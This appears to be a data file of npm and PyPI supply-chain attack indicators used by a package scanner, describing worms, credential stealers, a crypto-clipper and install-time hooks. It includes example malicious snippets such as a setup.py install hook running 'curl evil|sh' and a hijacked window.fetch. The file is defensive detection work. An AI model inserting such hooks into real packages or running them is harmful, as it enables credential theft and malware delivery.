metadata.description: Verified npm + PyPI supply-chain attack indicators (2024-2026). Each entry's detection_pattern is a Python regex matched by scan_plugin.py against package.json scripts/dependencies, file names, and source content. All incidents confirmed against primary sources (GitHub Advisory DB, CISA, PyPI blog, vendor post-mortems) on 2026-06-19.
metadata.note: These are NAMED-INCIDENT IOCs (CRITICAL) distinct from the generic dangerous-function patterns. The generic 'any postinstall script' check remains in scan_plugin.py; these add specific campaign attribution and escalate severity when a known IOC is matched.

shai_hulud_v1.description: Self-propagating npm worm: postinstall runs bundle.js, harvests NPM_TOKEN/GITHUB_TOKEN/cloud creds via TruffleHog, exfiltrates to attacker GitHub repos, and republishes the maintainer's other packages.
shai_hulud_v1.risk: Credential theft, worm propagation across a maintainer's entire package set

shai_hulud_v2.description: Second-wave npm worm using preinstall + Bun runtime to evade Node-based detection. Drops setup_bun.js / bun_environment.js obfuscated credential stealers; commits shai-hulud-workflow.yml.
shai_hulud_v2.risk: Credential theft via preinstall (wider surface than postinstall), evasion via Bun

nx_s1ngularity.description: Compromised nx releases: postinstall scans the filesystem for secrets (SSH keys, npm tokens, wallets), writes /tmp/inventory.txt, exfiltrates to s1ngularity-repository-* GitHub repos, and injects a destructive 'sudo shutdown' into shell rc files.

chalk_debug_clipper.description: Maintainer phished via support@npmjs.help; injected a browser crypto-clipper into chalk/debug/ansi-styles and ~18 packages. Hooks window.fetch / XMLHttpRequest / window.ethereum and swaps wallet addresses in-flight.
chalk_debug_clipper.risk: Cryptocurrency theft from any site bundling the compromised package
chalk_debug_clipper.example_suspicious: const orig = window.fetch; window.fetch = (...a) => { /* swap 0x... wallet */ }

axios_plain_crypto_js.description: Compromised axios 1.14.1 / 0.30.4 injected a hidden dependency plain-crypto-js@4.2.1 whose postinstall fetches a platform-specific RAT (macOS/Windows/Linux).
axios_plain_crypto_js.risk: Remote access trojan delivered on install

binding_gyp_implicit_build.incident: Implicit node-gyp build hook (recurring vector; blocked by default in npm v12, July 2026)
binding_gyp_implicit_build.description: A binding.gyp triggers an implicit node-gyp rebuild on install even with no explicit install script — a code-execution surface that npm v12 blocks by default.
binding_gyp_implicit_build.risk: Install-time native-build code execution without an explicit lifecycle script
binding_gyp_implicit_build.example_suspicious: binding.gyp present with a custom 'actions' build step

setup_py_install_exec.incident: setup.py / cmdclass install-time code execution (PyPI attack class)
setup_py_install_exec.description: Code that runs at 'pip install' time: os.system/subprocess inside setup.py, or a custom cmdclass overriding install.run() to execute a payload before any import.
setup_py_install_exec.risk: Arbitrary code execution on install, before the package is ever imported
setup_py_install_exec.example_suspicious: class PostInstall(install):\n    def run(self):\n        os.system('curl evil|sh')

pth_startup_hook.incident: Python .pth startup hook (litellm Mar 2026 / Hades June 2026)
pth_startup_hook.description: .pth files in site-packages are executed on every interpreter start if they begin with 'import'. Malware ships a .pth (e.g. litellm_init.pth) that imports/execs a stealer — persistent and import-free.
pth_startup_hook.risk: Persistent code execution on every Python invocation; credential/SSH/.env theft

litellm_c2.description: Compromised litellm 1.82.7/1.82.8 dropped litellm_init.pth and beaconed to litellm.cloud (registered hours before the attack), harvesting SSH keys/.env/cloud creds/k8s configs.

typosquat_payload.description: Typosquats of popular packages (requests, tensorflow, pillow) whose setup.py downloads a second-stage payload (zgRAT, wallet injectors targeting Exodus/Atomic).
typosquat_payload.risk: Malware delivery to users who mistype a popular package name
